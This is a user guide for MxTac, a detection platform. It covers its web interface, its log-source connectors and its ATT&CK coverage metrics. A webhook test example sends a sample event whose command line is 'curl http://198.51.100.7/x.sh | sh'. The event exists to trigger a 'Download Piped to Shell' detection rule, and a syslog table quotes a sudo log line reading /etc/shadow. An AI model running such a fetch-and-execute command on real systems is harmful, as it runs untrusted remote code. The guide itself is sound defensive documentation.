# User guide

How to use the web interface, connect sources and read ATT&CK coverage.

- [User interface](#user-interface)
- [Source integration guide](#source-integration-guide)
- [ATT&CK coverage](#attck-coverage)

## User interface

The frontend is a single-page application in `app/frontend/`: React 18, TypeScript, Vite, Tailwind CSS, React Router, TanStack Query and Zustand. Charts use Recharts. The Sigma rule editor uses Monaco.

The UI shows data from the API only. On a new installation every page shows zeros and empty states with a hint on what to do next.

### Pages

| Page | Path | Content |
|------|------|---------|
| Login | `/login` | Sign-in with email and password, the forced password change, and the MFA code |
| Overview | `/` | KPI cards, detection timeline, top tactics, recent detections, source status, coverage heatmap |
| Detections | `/detections` | Table with filters, sorting and CSV export. A side panel shows one detection. Status changes for one or several detections |
| Incidents | `/incidents` | Incident list with metric cards. Create an incident, change status and severity, assign, add notes, view the timeline |
| Hunt | `/hunt` | Event search form, result table, charts, event detail sheet, saved queries |
| ATT&CK Coverage | `/coverage` | Coverage statistics, technique matrix, per-source breakdown, trend chart, target dialog |
| Sigma Rules | `/rules` | Rule list. Create, edit, import, test, enable, disable and delete rules |
| Sources | `/sources` | Connector list, connector form, detail sheet, and a card for sending a webhook test event |
| Settings | `/settings` | Tabs: Profile and security, Users (admin only), Appearance |

Unknown paths redirect to `/`. All pages except Login require a signed-in user and redirect to `/login` otherwise. After the sign-in the page that was asked for opens, with its query string, so a shared link such as `/hunt?event=<id>` survives the sign-in.

#### Session

The access token is valid for 60 minutes by default. When the server answers a request with `401`, the UI obtains a new access token with `POST /api/v1/auth/refresh` and repeats the request, without anything visible to the user (`src/lib/api.ts`). Requests that fail at the same moment share one refresh. The refresh token is an HttpOnly cookie that scripts cannot read; see [security.md](security.md#sessions).

The UI signs the user out only when the refresh is refused: the session expired (7 days by default without a refresh), the user signed out in another tab, the password was changed, or the account was deactivated. The login page then shows "Your session has ended. Sign in again." and returns to the page that was open after the sign-in. Changing the own password signs out every other browser of the account; the browser that made the change stays signed in.

Dates are shown in the browser locale with the year, to the minute; event times on the Hunt page to the second. Durations are written as `45 s`, `5 min`, `2.0 h` or `1.5 d`.

The sidebar links to every page in three groups: Monitor, Investigate and Configure. Its footer shows the account, opens the MFA dialog, switches the theme, opens the shortcut list, signs out and collapses the sidebar.

The backend enforces what a role may do. The UI also hides or disables controls a role cannot use, as noted per page below. See [security.md](security.md).

#### Login

| Step | When | Content |
|------|------|---------|
| Sign in | Always | Email and password |
| Set a new password | The account must change its password: a new account, the first account `admin@mxtac.local`, or an expired password | New password and confirmation, with the password rules. The UI checks that both entries match and that the new password differs from the one just typed. "Back to sign in" cancels |
| Two-factor authentication | The account has MFA | A 6-digit code from the authenticator app, sent as soon as six characters are typed. "Use a backup code" switches to an 8-character backup code. "Back to sign in" cancels |

The steps follow each other: after a forced password change, an account with MFA is asked for its code. The password-change token is kept in memory only.

#### Overview

A time range (24 hours, 7, 30 or 90 days; default 7 days) applies to the page. The data refreshes every 60 seconds, and one second after a detection arrives over the WebSocket.

| Element | Content | Empty state |
|---------|---------|-------------|
| KPI cards | Detections with the change against the previous period, critical alerts, open incidents, ATT&CK coverage, mean time to detect, active Sigma rules | Zeros |
| Detections over time | Stacked bars by severity | "No detections in this period" |
| Top ATT&CK tactics | Detections by tactic. The change against the previous period is shown when that period had detections of the tactic | "No tactics observed yet" |
| Recent critical and high detections | Table with a link to Detections | "No critical or high detections" |
| Data sources | Status and event total of each connector. The engineer and admin roles also get a link to Sources | "No data sources connected", with an "Add a source" button for the engineer and admin roles |
| ATT&CK coverage heatmap | Technique families by tactic, see [Overview page](#overview-page) | A grid of zeros |

#### Detections

| Element | Content |
|---------|---------|
| Filters | Search text, tactic, host, severity chips, status chips, "Clear filters" |
| Table | Sortable by score, severity, tactic, host and time. 25, 50 or 100 rows per page. Under the name, a row shows the process or command line of the matched event |
| Export CSV | Up to 10,000 rows with the current filters and sort order |
| Live banner | Counts detections that arrived over the WebSocket since the list was loaded, with a "Show" button |
| Bulk actions | Select up to 500 rows: investigate, resolve, mark as false positive, reopen, or create an incident from the selection |
| Side panel | All fields of one detection, including the ATT&CK technique name, the user, process and log source of the matched event and the ID of the rule, an "Assign to" form and status buttons. "Open event in Hunt" opens the event that caused the detection (`/hunt?event=<id>`); it is shown to the hunter, engineer and admin roles, for detections that the pipeline created with this version or later |

Empty states: "No detections yet" on a new installation, "No detections match the filters" with filters set. The viewer role sees no checkboxes, bulk actions, assign form or status buttons.

#### Incidents

| Element | Content |
|---------|---------|
| Metric cards | Open incidents with the severity breakdown, new this week, mean time to resolve, mean time to detect. Time to detect is the time from the earliest linked event to the creation of the incident; an incident without linked detections has none |
| Filters | Search text, assignee, "Assigned to me", sort order, severity and status chips |
| Table | 20 rows per page |
| New incident | Title, severity, description, assignee, and detection IDs when it is not opened from a selection on the Detections page |
| Side panel | Status (it only moves forward: new, investigating, contained, resolved, closed), severity, assignee. Tabs for details, timeline with notes, and linked detections |

Empty states: "No incidents yet", "No incidents match the filters". The viewer role cannot create or change incidents or add notes.

#### Hunt

Hunt is open to the hunter, engineer and admin roles. Other roles see a notice instead of the page.

| Element | Content |
|---------|---------|
| Search form | Query text, time range (1 hour to 30 days; default 24 hours), and up to 50 filters on host, user, source IP, destination IP, source, event class, class UID, severity ID and process hash |
| Event volume | Chart of events over time |
| Top values | Most frequent values of a selectable field. Clicking a value adds a filter |
| Results | Table with 50 rows per page, below the charts at full width. Shows the query and a copy button. A failed search shows the reason from the server |
| Event detail sheet | The full event, copy buttons, and for each entity (host, user, IP, hash) a filter action and a timeline of that entity's events. The open event is part of the address (`/hunt?event=<id>`), so the address can be shared and a detection can link to its event. An event that cannot be loaded, for example one older than the retention period, is reported above the search form |
| Saved queries | Save the current search, run, edit and delete saved ones |
| Export CSV | Up to 10,000 rows |

Empty states: "No events match this search", "No events in this time range", "No saved queries". The search text is matched as one case-insensitive substring of the summary, event class, host, user, addresses and process command line; see [development.md](development.md#event-document).

#### ATT&CK Coverage

| Element | Content |
|---------|---------|
| Stat cards | Technique coverage with the target marker, target status with "Edit target", techniques without a rule, techniques covered only by disabled rules |
| Coverage trend | 7, 30 or 90 days, with the target line. Empty state: "No snapshots yet" |
| Coverage by data source | Covered techniques and rule counts per source type |
| Tactic and technique matrix | Coverage per tactic, with the name of each technique family |
| Techniques | Tabs "Covered" and "Gaps", with the technique names and a search for a technique ID or name |
| Download Navigator layer | An ATT&CK Navigator layer as a JSON file |

Technique names come from the MITRE ATT&CK table bundled with the backend (`GET /api/v1/attack/techniques`, see [Technique names](#technique-names)). They are shown wherever the UI shows a technique ID: in detections, incidents, the coverage lists and matrix, and as tooltips on the technique tags of the Sigma Rules page and the Overview heatmap. A sub-technique is written with its parent, for example "OS Credential Dumping: LSASS Memory". An ID the table does not contain is shown alone.

The viewer role does not see "Edit target". With the 20 bundled rules enabled, a new installation already shows coverage. The numbers are explained in [ATT&CK Coverage](#attck-coverage).

#### Sigma Rules

| Element | Content |
|---------|---------|
| Stat cards | Rules, enabled, critical, high |
| Filters | Search by title, ID or technique (ID or name); level; enabled or disabled. 50 rows per page |
| Table | Title and ID, level, techniques, log source, status, hits, false positives, an enable switch and actions |
| Rule editor | Monaco YAML editor with a syntax marker and a "Format" button. Checks for `title`, `detection` and `condition` before sending |
| Import | Sigma YAML with one or more documents, up to 10 MB. Invalid documents are skipped. When any was skipped the dialog stays open and lists the reason for each, also when other documents were imported |
| Test | Evaluate a rule against a sample event. The result is "Matched", "No match" or "Rule error" with the messages |
| Reload engine | Loads all rules from the database into the engine again |

A new installation lists the 20 bundled rules. The page does not show whether a rule is bundled or custom. Errors from the backend, including the message for unsupported Sigma syntax, are shown under the editor, in the import dialog and in the test panel.

Only the engineer and admin roles see "New rule", "Import", "Reload engine" and "Delete", and can use the enable switch. The hunter role can open a rule read-only, test it and mark a false positive. The viewer and analyst roles see a notice instead of the page.

#### Sources

| Element | Content |
|---------|---------|
| Stat cards | Sources, running, in error, events received. Refreshes every 30 seconds |
| Table | Status, event and error counts, last seen, an enable switch, and actions: start or stop, test connection, edit, delete |
| Add source | A form per type, see the table below |
| Detail sheet | Health, counters and the last error of one source |
| Send a test event | Explains `POST /api/v1/ingest`, shows a `curl` command and sends a sample event to a generic webhook source |

| Type | Fields | Start and stop | Test connection |
|------|--------|:--------------:|:---------------:|
| Wazuh | Manager API URL, user name, password, TLS verification, poll interval | Yes | Yes |
| Zeek | Log directory, log types, poll interval | Yes | Yes |
| Suricata | EVE JSON file, event types, poll interval | Yes | Yes |
| Syslog | Bind address, UDP port, maximum message size | Yes | No |
| Generic webhook | Webhook token, with a "Generate" button. The token cannot be shown again after saving | No | No |

Stored settings are not shown when a source is edited; only the fields that are filled in are changed. The empty state reads "No data sources yet". Sources is open to the engineer and admin roles. Other roles see a notice instead of the page.

A generic webhook source has nothing to start: it is "Active" while it is enabled, and a disabled one refuses events. Event and error counts are stored in the database: a webhook source counts with every accepted request, a polling source after every poll, and a syslog source every 5 seconds. A source name can be used once.

#### Settings

| Tab | Content |
|-----|---------|
| Profile and security | Email, name and role (read-only). MFA status with "Set up MFA". A form to change the password: current password, new password and confirmation. The new password cannot be one of the last two |
| Users (admin only) | User table with role, status, a "Password pending" mark for accounts that still have to change their password, and MFA state. Add user, edit name and role, deactivate, reactivate, reset MFA. A deactivated account stays in the table as "Inactive" |
| Appearance | Light or dark theme, saved in the browser |

Add user asks for email, full name, role and a temporary password. The user must change the temporary password at the first sign-in. An administrator cannot change the own role or deactivate the own account.

MFA setup shows a QR code and a key for manual entry, asks for one code, and then shows the backup codes with "Copy all" and "Download .txt". A user cannot switch MFA off; an administrator resets it on the Users tab.

### Live updates

New detections arrive over a WebSocket (`/api/v1/ws/alerts`) and are shown without reloading the page. The top bar shows the state of the connection.

| Indicator | Meaning |
|-----------|---------|
| Live | Connected |
| Reconnecting | The connection dropped. The UI tries again every 5 seconds, each time with the current access token, and at once after a silent refresh of the session |
| Offline | Not connected and not retrying: there is no access token, the session is over, or the account may not read the stream. Sign in again |

The hook is `src/hooks/useAlertStream.ts`. The server refuses a missing, invalid or expired token before it accepts the connection, which a browser reports like a network failure. For a connection that closes without having opened, or with code 1008, the hook therefore asks `GET /api/v1/auth/me`. That request goes through the API client, which renews an expired access token. When a new access token came back, the hook reconnects immediately with it and the indicator returns to Live. It stops when the answer is `401` (the session could not be renewed), or when the token is unchanged and the server still answers 1008. Opening another page starts a new attempt.

### Keyboard shortcuts

| Keys | Action |
|------|--------|
| `g` then `d` | Overview |
| `g` then `e` | Detections |
| `g` then `i` | Incidents |
| `g` then `h` | Hunt |
| `g` then `c` | ATT&CK Coverage |
| `g` then `r` | Sigma Rules |
| `g` then `s` | Sources |
| `/` | Focus the search field of the page (Detections, Incidents, Hunt, Sigma Rules, Sources) |
| `?` | Show the shortcut list |
| `Esc` | Close the shortcut list or the open panel |

The second key of a `g` shortcut must follow within 1.5 seconds. Shortcuts are ignored while typing in a field and while Ctrl, Alt or the Meta key is held.

### Design tokens

The UI uses a token system in the style of shadcn/ui. Colors are CSS variables, Tailwind maps utility classes to those variables, and components use the utility classes.

| File | Role |
|------|------|
| `src/index.css` | Defines the variables for the light theme under `:root` and for the dark theme under `.dark` |
| `tailwind.config.js` | Maps Tailwind color names (`background`, `foreground`, `card`, `primary`, `secondary`, `muted`, `accent`, `destructive`, `border`) to the variables. Sets `darkMode: 'class'` |
| `src/components/ui/` | Base components built on Radix UI primitives and `class-variance-authority` |

Token groups in `src/index.css`:

| Group | Examples | Use |
|-------|----------|-----|
| Surface and text | `--background`, `--foreground`, `--card`, `--muted`, `--border` | Page, cards, text, borders |
| Action | `--primary`, `--destructive`, `--ring` | Buttons, focus ring |
| Sidebar | `--sidebar-bg`, `--sidebar-active`, `--sidebar-text` | Navigation |
| Charts | `--chart-1` to `--chart-5` | Chart series |
| Severity | `--sev-critical-*`, `--sev-high-*`, `--sev-medium-*`, `--sev-low-*`, `--sev-info-*` | Severity badges, through the classes `sev-critical`, `sev-high`, `sev-medium`, `sev-low`, `sev-info` |
| Status | `--status-green-*`, `--status-purple-*` | Status pills, through the classes `status-green` and `status-purple` |

Base components in `src/components/ui/`: `badge`, `button`, `card`, `dialog`, `dropdown-menu`, `empty-state`, `input`, `label`, `select`, `separator`, `sheet`, `skeleton`, `switch`, `table`, `tabs`, `textarea`.

#### Themes

There are two themes, light and dark. The first visit follows the operating system setting. The choice is saved in the browser. The theme is applied by setting the `dark` class and a `data-theme` attribute on the `<html>` element (`src/stores/uiStore.ts`).

#### Rules for new UI code

- Use the base components instead of raw `<button>`, `<input>` or `<select>` elements.
- Use token classes (`bg-card`, `text-muted-foreground`, `border-border`) instead of fixed colors, so that both themes work.
- Use the `sev-*` and `status-*` classes for severity and status colors.
- Show an empty state when there is no data. Do not fill a page with placeholder values.

## Source integration guide

MxTac has five source types. All five feed the detection pipeline: their events are normalized to OCSF, stored, searchable in Hunt and evaluated by Sigma rules.

| Type | Input | Normalizer |
|------|-------|------------|
| `wazuh` | Polls the Wazuh manager REST API | `services/normalizers/wazuh.py` |
| `zeek` | Reads Zeek log files from a directory | `services/normalizers/zeek.py` |
| `suricata` | Reads the Suricata EVE JSON file | `services/normalizers/suricata.py` |
| `syslog` | Listens for syslog messages | `services/normalizers/syslog.py` |
| `generic` | Receives JSON over HTTP (webhook) | `services/normalizers/webhook.py` |

Normalizer paths are relative to `app/backend/app/`.

### Managing connectors

A connector is a named configuration stored in the database. Create and manage connectors on the **Sources** page or through the API. The `engineer` and `admin` roles can do this.

| Action | Route |
|--------|-------|
| List | `GET /api/v1/connectors` |
| Create | `POST /api/v1/connectors` |
| Update or disable | `PATCH /api/v1/connectors/{id}` |
| Delete | `DELETE /api/v1/connectors/{id}` |
| Test the connection | `POST /api/v1/connectors/{id}/test` (Wazuh, Zeek and Suricata) |
| Health and counters | `GET /api/v1/connectors/{id}/health` |
| Start, stop | `POST /api/v1/connectors/{id}/start`, `POST /api/v1/connectors/{id}/stop` |

Create request:

```json
{
  "name": "wazuh-main",
  "connector_type": "wazuh",
  "enabled": true,
  "config": { }
}
```

`config` holds the settings from the sections below. Enabled connectors start with the backend. Connector settings are stored in the database without encryption. A name can be used once; a second connector with the same name is refused with `409`.

A new installation has no connectors. The Sources page and the source status card on the Overview page stay empty until you add one.

File-based connectors (Zeek, Suricata) read paths **inside the backend container**. Mount the log directory into the container, for example in `app/docker-compose.yml`:

```yaml
  backend:
    volumes:
      - ./backend:/app
      - /var/log/suricata:/var/log/suricata:ro
      - /opt/zeek/logs/current:/opt/zeek/logs/current:ro
```

Read positions for Zeek and Suricata files are saved under `/var/lib/mxtac` in the container (override with the `MXTAC_STATE_DIR` environment variable). Mount a volume there to keep positions across container re-creation.

### Wazuh

The connector authenticates against the Wazuh manager API with `GET /security/user/authenticate` and then polls `GET /alerts` for alerts newer than the last poll.

| Setting | Required | Default | Description |
|---------|----------|---------|-------------|
| `url` | Yes | | Base URL of the Wazuh API, for example `https://wazuh.internal:55000` |
| `username` | Yes | | Wazuh API user |
| `password` | Yes | | Password of that user |
| `verify_ssl` | No | `true` | Set to `false` for a self-signed certificate |
| `poll_interval_seconds` | No | `60` | Seconds between polls |

After a failed poll the connector retries with a delay that grows from 1 to 60 seconds.

### Zeek

The connector tails Zeek log files and tags each event with the log type. It reads JSON logs and has a basic parser for the tab-separated format.

| Setting | Required | Default | Description |
|---------|----------|---------|-------------|
| `log_dir` | Yes | `/opt/zeek/logs/current` | Directory that contains the log files |
| `log_types` | No | `["conn", "dns", "http", "ssl", "files"]` | Log types to read. Each maps to `<type>.log` |
| `poll_interval_seconds` | No | `60` | Seconds between reads |

JSON logs are the better-supported format. To enable them in Zeek, load `policy/tuning/json-logs.zeek`.

### Suricata

The connector tails the EVE JSON file. On the first start it begins at the end of the file, so only new events are read. After a log rotation it starts again from the beginning of the new file.

| Setting | Required | Default | Description |
|---------|----------|---------|-------------|
| `eve_file` | Yes | `/var/log/suricata/eve.json` | Path to the EVE JSON file |
| `event_types` | No | `["alert", "dns", "http", "tls"]` | EVE `event_type` values to ingest. Other events are skipped |
| `poll_interval_seconds` | No | `60` | Seconds between reads |

### Syslog

There are two ways to receive syslog. Both parse RFC 3164 and RFC 5424 messages and publish them to the same queue topic.

**Syslog connector** (a connector of type `syslog`, UDP only):

| Setting | Default | Description |
|---------|---------|-------------|
| `host` | `0.0.0.0` | Bind address |
| `port` | `514` | UDP port |
| `max_message_size` | `65535` | Larger datagrams are dropped |

**Syslog receiver** (configured with environment variables, UDP and TCP, no connector row needed):

| Variable | Default | Description |
|----------|---------|-------------|
| `SYSLOG_ENABLED` | `false` | Start the receiver with the backend |
| `SYSLOG_HOST` | `0.0.0.0` | Bind address |
| `SYSLOG_PORT` | `1514` | Port |
| `SYSLOG_PROTOCOL` | `udp` | `udp`, `tcp` or `both` |
| `SYSLOG_MAX_MESSAGE_SIZE` | `65535` | Maximum message size in bytes |

The Compose files do not publish a syslog port. Add a port mapping to the `backend` service, for example `"514:1514/udp"` for the receiver.

#### How a syslog message is normalized

| Syslog part | Normalized event |
|-------------|------------------|
| Timestamp | Event time. An RFC 3164 timestamp has no year and no time zone; the current year and UTC are assumed |
| Host name in the message, sender address | `dst_endpoint.hostname`, `dst_endpoint.ip`. This is the host that shows on a detection |
| Program name and process ID | `process.name`, `process.pid`, and the field `app_name` |
| Severity 0 to 7 | OCSF severity: 0 to 2 critical, 3 high, 4 medium, 5 low, 6 and 7 informational |
| Message text | Field `message` |
| Facility | Fields `facility` and `facility_name` |

Two message families get a more specific event class:

| Message | Event class | Extracted |
|---------|-------------|-----------|
| SSH login results (`Failed password for ...`, `Accepted publickey for ...`, `Invalid user ...`) and PAM `authentication failure` | Authentication | User in `actor_user.name`, remote address and port in `src_endpoint` |
| sudo command log (`alice : TTY=... ; COMMAND=/usr/bin/cat /etc/shadow`) | Process Activity | Command in `process.cmd_line`, program path in `process.path`, invoking user in `actor_user.name` |

Every other message is stored as a Base Event. Rules can still match it through the `message` and `app_name` fields.

Each event names the services `syslog`, the program name in lower case, and `auth` or `cron` for those facilities. Sigma rules with a `logsource.service` use these names.

#### Test message

With a syslog port published on 514/udp:

```bash
echo "<38>$(date -u '+%b %e %H:%M:%S') web01 sshd[2211]: Failed password for root from 203.0.113.5 port 51122 ssh2" \
  | nc -u -w1 localhost 514
```

The bundled rule "SSH Failed Password for Root" matches this message and creates a detection on the host `web01`. The event is stored with the time in the message, read as UTC.

### Generic webhook

1. Create a connector of type `generic` with a token:

   ```json
   {
     "name": "custom-source",
     "connector_type": "generic",
     "config": { "webhook_token": "<a long random string>" }
   }
   ```

2. Send events as a JSON object or an array of objects:

   ```bash
   curl -X POST http://localhost:15000/api/v1/ingest \
     -H "X-MxTac-Source: custom-source" \
     -H "X-MxTac-Token: <the token>" \
     -H "Content-Type: application/json" \
     -d '[{"timestamp": "2026-01-01T12:00:00Z", "host": "web01", "user": "alice", "command_line": "curl http://198.51.100.7/x.sh | sh", "message": "Suspicious download"}]'
   ```

   The response has the status `202` and reports how many events were accepted: `{"accepted": 1, "rejected": 0}`. Array items that are not JSON objects are counted as rejected.

   The bundled rule "Download Piped to Shell" matches this example and creates a detection on the host `web01`.

| Limit | Value |
|-------|-------|
| Body size | 5 MB |
| Requests per source | 100 per minute |
| Requests per client IP | 60 per minute (general write limit) |

`POST /api/v1/ingest/test` checks the source name and token without sending events. The **Sources** page has a "Send test event" card that posts a sample event from the browser.

#### How a webhook event is normalized

The normalizer looks for common field names. The first name of a row that is present is used.

| Field names in the event | Normalized event |
|--------------------------|------------------|
| `timestamp`, `time`, `@timestamp` | Event time. ISO 8601, or epoch seconds or milliseconds. Without it, the time of receipt |
| `host`, `hostname` | `dst_endpoint.hostname`, the host that shows on a detection |
| `user`, `username`, `user_name` | `actor_user.name` |
| `src_ip`, `source_ip` | `src_endpoint.ip` |
| `dst_ip`, `dest_ip`, `destination_ip` | `dst_endpoint.ip` |
| `src_port`, `source_port` | `src_endpoint.port` |
| `dst_port`, `dest_port`, `destination_port` | `dst_endpoint.port` |
| `process`, `process_name` | `process.name` |
| `process_path`, `image`, `exe` | `process.path`, the full path of the program. Sigma conditions on `Image` or `path` use it |
| `command_line`, `cmd_line`, `commandline`, `command` | `process.cmd_line` |
| `pid`, `process_id` | `process.pid` |
| `message`, `msg` | Field `message`, also used as the event summary |
| `severity`, `level` | Severity. A number from 0 to 5, or a name such as `low`, `warning`, `high`, `critical` |
| `id`, `event_id` | Event UID |
| `os`, `os_name` | Operating system of the host. Sigma rules for a `product` such as `linux` or `windows` use it |
| `service` | Service names for Sigma rules with a `logsource.service` |

Every other top-level field is kept under its own name, and Sigma rules can reference it. The original object is stored with the event.

| Event content | Event class |
|---------------|-------------|
| A process name, a process path or a command line | Process Activity |
| A source and a destination address | Network Activity |
| Anything else | Base Event |

The name of the connector is kept in the raw event as `unmapped.source`, and Sigma rules can reference it as `source`. The flat field `source` that the Hunt page shows and filters on is the source type (`Webhook`, `Syslog`, `Wazuh`, `Zeek`, `Suricata`), not the connector name.

A source that is disabled refuses events and the test request with `403`. Each accepted request adds its number of events to the event count of the source and sets "last seen".

### Checking that events arrive

1. Open the **Sources** page. A running connector shows its status, event count and when it was last seen. The counts of a polling connector are written after each poll, those of a syslog connector every 5 seconds, and those of a webhook source with each request.
2. Open **Hunt** and run a search, for example for a word of the message, the host or the user, or with a filter on the source.
3. Open **Detections**. An event that matches an enabled rule creates a detection. The same rule on the same host creates at most one detection in 5 minutes.
4. Check the backend log: `docker compose logs -f backend`.
5. Check the metrics at `/metrics`, for example the counters for ingested events and dead-letter events.

## ATT&CK coverage

This document describes how MxTac calculates the numbers on the ATT&CK Coverage page and the Overview page. The code is in `app/backend/app/repositories/rule_repo.py`, `app/backend/app/repositories/detection_repo.py` and `app/backend/app/api/v1/endpoints/coverage.py`.

### What "covered" means

A technique is covered when at least one **enabled** rule in the `rules` table has a tag for it (`attack.tNNNN` or `attack.tNNNN.NNN`).

Coverage is a statement about rules, not about data. It does not check that a source delivers the events a rule needs, and it does not check that the rule matches real attacks.

The bundled rules from `app/backend/sigma_rules/` are imported into the `rules` table at startup and count like any other rule. A new installation with the 20 bundled rules enabled reports 21 covered technique IDs, which is 20.0 %. Disabling or deleting rules lowers the number. See [sigma-rules.md](sigma-rules.md).

All numbers come from the `rules` and `detections` tables. Nothing is estimated or filled in.

### Coverage percentage

```
covered_count = number of distinct technique IDs tagged on enabled rules, capped at 105
coverage_pct  = covered_count / 105 * 100, rounded to one decimal
```

The total of 105 is a fixed number in the code. It is the sum of per-tactic totals for the nine tactics the UI tracks:

| Tactic | Label | Total |
|--------|-------|-------|
| Reconnaissance | RECON | 9 |
| Resource Development | RES | 6 |
| Initial Access | INIT | 9 |
| Execution | EXEC | 14 |
| Persistence | PERS | 12 |
| Privilege Escalation | PRIV | 11 |
| Defense Evasion | DEF-E | 17 |
| Credential Access | CRED | 14 |
| Discovery | DISC | 13 |

Limits of this method:

- The scope is nine tactics. Lateral Movement, Collection, Command and Control, Exfiltration and Impact are not part of the total.
- Technique IDs are counted as tagged. `T1003` and `T1003.001` count as two. A technique from a tactic outside the nine still counts towards `covered_count`.
- The totals are constants and do not follow new ATT&CK releases.

Treat the percentage as a progress indicator for your rule set, not as a measurement against the full ATT&CK matrix.

### Routes

All routes require the `detections:read` permission, except setting the target, which requires `detections:write`.

| Route | Result |
|-------|--------|
| `GET /api/v1/coverage` | `coverage_pct`, `covered_count`, `total_count` |
| `GET /api/v1/coverage/gaps` | `gap_count` (105 minus `covered_count`) and `uncovered_techniques`: technique IDs that appear on some rule but on no enabled rule. These are techniques you could cover by enabling a rule you already have |
| `GET /api/v1/coverage/by-datasource` | Covered techniques and rule counts per source type, derived from each rule's `logsource` (table below) |
| `GET /api/v1/coverage/trend?days=30` | One point per day. The route stores today's value each time it is called, so days on which nobody opened the page have no point. Nothing is stored while coverage is zero. There is no history from before the first call |
| `GET /api/v1/coverage/navigator` | An ATT&CK Navigator layer. The score of a technique is the number of enabled rules tagged with it |
| `GET /api/v1/coverage/target` | The configured target and whether current coverage is below it. Defaults to 80 %, disabled |
| `PUT /api/v1/coverage/target` | Set the target percentage, label and whether it is enabled |

#### Source classification

| Source | Rule `logsource` |
|--------|------------------|
| Wazuh | `product` is `windows`, `linux`, `macos`, `unix` or `endpoint` |
| Zeek | `product` is `zeek`, or `category` is `network_connection`, `network_flow`, `dns`, `proxy`, `http`, `ssl` or `network` |
| Suricata | `product` is `suricata`, or `service` contains `suricata` |

Rules that match none of these are not assigned to a source.

This classification is used for the coverage breakdown only, and it is coarser than the engine:

- There is no entry for syslog or webhook sources. Rules with the product `linux` or `windows` are listed under Wazuh, although the engine also evaluates them for syslog and webhook events.
- A rule with only `category: dns_query`, like the two bundled DNS rules, is not assigned to a source. The Zeek list contains `dns`, not `dns_query`.

Which events a rule is actually evaluated against is described in [sigma-rules.md](sigma-rules.md).

### Overview page

| Element | Source |
|---------|--------|
| Coverage KPI card | Same calculation as `GET /api/v1/coverage`. The change value compares with a stored trend snapshot |
| Heatmap (`GET /api/v1/overview/coverage/heatmap`) | Built from detections, not rules. A grid of four technique families (`T1059`, `T1003`, `T1021`, `T1078`) by the nine tactics. A cell counts the distinct technique IDs of that family that were detected under that tactic |

The heatmap reads the `tactic` column of a detection as a tactic name, for example `Credential Access`. The pipeline stores that name; a row of an earlier version that holds the tactic ID, for example `TA0006`, is counted under the tactic it names.

A cell with at least one detected technique is tinted with at least 30 % of the accent color, so that it stands out in both themes.

Limitation of the heatmap: it only has the four technique families and nine tactics listed above. A detection of another technique family, or under a tactic outside the nine (Lateral Movement, Collection, Command and Control, Exfiltration, Impact), is not shown in it. The "Top ATT&CK tactics" list on the Overview page counts every detection.

### Technique names

The backend bundles a table of the MITRE ATT&CK Enterprise techniques and sub-techniques (`app/backend/app/data/attack_techniques.json`, ID to name). Its header states the ATT&CK version and the date the data was downloaded. Revoked and deprecated techniques are not part of it.

| Use | Behaviour |
|-----|-----------|
| New detections | The pipeline stores the ATT&CK name of the first technique of the rule in `technique_name`. For a technique the table does not know, it stores the ID |
| Existing detections | Rows written by earlier versions hold the rule title in `technique_name`. The API answers with the name from the table instead; the rows are not rewritten. For an unknown ID the stored value is returned |
| Heatmap | Each row of `GET /api/v1/overview/coverage/heatmap` carries the `technique_name` of its family |
| Everything else | `GET /api/v1/attack/techniques` returns the whole table (`attack_version`, `retrieved`, `techniques`). The UI loads it once and uses it for rule tags, incident techniques and the coverage lists |

A sub-technique is named with its parent, as on attack.mitre.org: `T1003.001` is "OS Credential Dumping: LSASS Memory".

To update the table to a newer ATT&CK release, run the generator with the release number and commit the result together with the version in `NOTICE`:

```bash
python scripts/gen_attack_techniques.py 20.1
```

It downloads the STIX bundle of that release tag from <https://github.com/mitre/cti>. The names are (c) The MITRE Corporation and are reproduced under the ATT&CK terms of use; the `NOTICE` file at the repository root carries the required notice.
